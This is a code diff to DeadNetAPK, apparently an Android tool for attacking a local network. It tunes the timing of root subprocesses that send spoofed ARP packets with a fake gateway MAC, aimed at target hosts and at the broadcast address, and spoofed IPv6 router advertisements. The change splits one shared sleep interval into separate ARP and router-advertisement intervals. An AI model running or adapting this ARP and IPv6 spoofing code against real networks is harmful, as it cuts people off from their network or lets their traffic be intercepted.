@@ -39,7 +39,8 @@ class DeadNetAPK:
 
     def __init__(self, iface: str, gateway_ipv4: str, gateway_ipv6: str, gateway_mac: str, print_mtd: str):
         self._spoof_ipv6ra_interval = 5
-        self._executor_sleep_interval = 0.5
+        self._arp_sleep_interval = 0.2 # todo rename
+        self._nra_sleep_interval = 2 # todo rename
         self._max_workers = 3 # todo remove
 
         self._arp_ind_proc_pid = self._arp_bcast_proc_pid = self._nra_proc_pid = None
@@ -134,7 +135,7 @@ class DeadNetAPK:
         self._arp_ind_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {','.join(self._host_ipv4s)} {self._gateway_mac_fake} "
-             f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._executor_sleep_interval}"],
+             f"{self._gateway_ipv4} {self._gateway_mac} {self._my_mac} {self._arp_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         ).pid
@@ -144,7 +145,7 @@ class DeadNetAPK:
         self._arp_bcast_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.arp_path} {self._network_interface} {self._gateway_ipv4} {self._gateway_mac_fake} "
-             f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._executor_sleep_interval}"],
+             f"{','.join(self._host_ipv4s)} ff:ff:ff:ff:ff:ff {self._my_mac} {self._arp_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         ).pid
@@ -158,7 +159,7 @@ class DeadNetAPK:
         self._nra_proc_pid = subprocess.Popen(
             ["su", "-c",
              f"{self.nra_path} {self._gateway_mac} {self._gateway_ipv6} {self._ipv6_prefix} "
-             f"{self._ipv6_preflen} {self._network_interface} {self._executor_sleep_interval}"],
+             f"{self._ipv6_preflen} {self._network_interface} {self._nra_sleep_interval}"],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         ).pid
@@ -193,7 +194,7 @@ class DeadNetAPK:
 
         while not self._abort:
             # todo try raise exc here and see if we handle it correctly
-            time.sleep(0.5)
+            time.sleep(0.5)  # todo into var
 
         self._terminate_all_attacks()
 
